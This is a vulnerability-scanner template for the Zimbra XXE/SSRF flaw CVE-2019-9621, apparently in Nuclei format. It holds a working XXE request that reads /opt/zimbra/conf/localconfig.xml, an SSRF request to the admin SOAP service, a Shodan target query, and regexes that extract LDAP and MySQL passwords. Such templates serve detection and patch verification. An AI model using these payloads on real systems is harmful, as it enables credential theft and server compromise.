id: CVE-2019-9621

info:
  name: Zimbra Collaboration Suite - XXE to RCE Chain
  author: pdteam
  severity: critical
  description: |
    Zimbra Collaboration Suite versions 8.5 to 8.7.11 are vulnerable to XML External Entity (XXE) injection 
    that can be chained with SSRF to achieve remote code execution through JSP shell upload.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb
    - https://www.exploit-db.com/exploits/46693/
    - https://github.com/k8gege/ZimbraExploit
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-9621
    cwe-id: CWE-611
  metadata:
    verified: true
    max-request: 2
    shodan-query: 'http.title:"zimbra collaboration suite"'
  tags: cve,cve2019,zimbra,xxe,rce,ssrf

http:
  - raw:
      - |
        POST /Autodiscover/Autodiscover.xml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml
        Content-Length: 299
        
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE xxe [
          <!ENTITY xxe SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
        ]>
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
          <Request>
            <EMailAddress>&xxe;</EMailAddress>
            <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
          </Request>
        </Autodiscover>

      - |
        POST /service/proxy?target=https://{{Hostname}}/service/admin/soap/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/soap+xml
        Content-Length: 450
        
        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
          <soap:Header>
            <context xmlns="urn:zimbra">
              <userAgent name="ZimbraWebClient - SAF3" version="5.0.18_GA_3027"/>
            </context>
          </soap:Header>
          <soap:Body>
            <AuthRequest xmlns="urn:zimbraAdmin">
              <name>zimbra</name>
              <password>{{randstr}}</password>
            </AuthRequest>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "zimbra_ldap_password"
          - "localconfig"
        condition: or

      - type: word
        part: body
        words:
          - "Zimbra"
          - "zimbra"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - "zimbra_ldap_password.*?value=\"([^\"]+)\""
          - "zimbra_mysql_password.*?value=\"([^\"]+)\""